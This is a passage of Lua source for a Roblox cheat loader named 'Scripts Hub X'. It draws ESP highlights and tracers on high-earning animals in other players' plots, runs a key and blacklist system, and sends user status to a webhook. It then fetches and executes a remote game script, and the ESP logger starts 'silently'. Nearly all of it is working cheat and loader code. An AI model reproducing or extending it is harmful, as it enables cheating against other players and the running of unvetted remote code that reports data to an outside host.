								-- Remove ESP if generation dropped below threshold
								if espContainer.highlight then
									espContainer.highlight:Destroy()
								end
								if espContainer.nameLabel then
									espContainer.nameLabel:Destroy()
								end
								if espContainer.tracer then
									if espContainer.tracer.beam then
										espContainer.tracer.beam:Destroy()
									end
									if espContainer.tracer.attachment0 then
										espContainer.tracer.attachment0:Destroy()
									end
									if espContainer.tracer.attachment1 then
										espContainer.tracer.attachment1:Destroy()
									end
								end
								espObjects[espId] = nil
								print("🔻 Removed ESP for brainrot that dropped below 700k/s threshold")
							end
						end
					end
				end
			end
		end)
		
		-- Also monitor for plot changes (new plots being added)
		local plots = workspace:FindFirstChild("Plots")
		if plots then
			plots.ChildAdded:Connect(function(child)
				if child:IsA("Model") or child:IsA("Folder") then
					task.wait(3) -- Wait for plot to fully load
					checkForHighGenerationAnimals()
				end
			end)
		else
			-- Wait for Plots folder to be created
			workspace.ChildAdded:Connect(function(child)
				if child.Name == "Plots" then
					child.ChildAdded:Connect(function(plot)
						if plot:IsA("Model") or plot:IsA("Folder") then
							task.wait(3)
							checkForHighGenerationAnimals()
						end
					end)
				end
			end)
		end
		
		print("✅ High-Generation Brainrot Logger initialized successfully")
	end
end

-- ================================
-- MAIN EXECUTION WITH ENHANCED GENERATION-BASED DETECTION
-- ================================

spawn(function()
	print("🚀 Starting Scripts Hub X with Enhanced High-Generation ESP (700k/s+) and Randomized Key System...")
	print("🔧 Key System Status: " .. (Keysystem and "ENABLED" or "DISABLED"))
	print("?? Generation Threshold: " .. tostring(MIN_GENERATION_THRESHOLD) .. "/s")
	
	-- Check user status
	local userStatus = checkUserStatus()
	
	-- Handle blacklisted users
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	-- Handle key system for non-premium users (only if Keysystem is true)
	if userStatus == "regular" and Keysystem then
		print("🔑 Regular user detected - Loading randomized key system...")
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("❌ Key system failed or timed out")
			notify("Scripts Hub X", "❌ Key verification failed or timed out.")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("🔓 Key system disabled - Bypassing for regular user")
		userStatus = "regular-bypassed"
	else
		print("✅ Premium/Staff/Owner user - Bypassing key system")
	end
	
	-- Check game support
	local isSupported, scriptUrl = checkGameSupport()
	
	-- Send webhook notification
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	-- Initialize Enhanced High-Generation Animal Logger with ESP (silently)
	initializeHighGenerationAnimalLogger()
	
	-- Handle unsupported games
	if not isSupported then
		print("❌ Game not supported")
		notify("Scripts Hub X", "❌ Game is not supported yet.")
		return
	end
	
	-- Load and execute the game script
	print("🎮 Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("✅ Scripts Hub X | Complete for " .. userStatus .. " user")
		if userStatus == "regular-keyed" then
		    print("Scripts Hub X", "✅ Key verified with randomized API! High-Gen Detection active.")
		elseif userStatus == "regular-bypassed" then
			print("Scripts Hub X", "✅ High-Generation Detection active (Key system bypassed).")
		else
			print("Scripts Hub X", "✅ High-Generation Detection active.")
		end
	else
		print("❌ Script failed to load: " .. tostring(errorMsg))
	end
end))
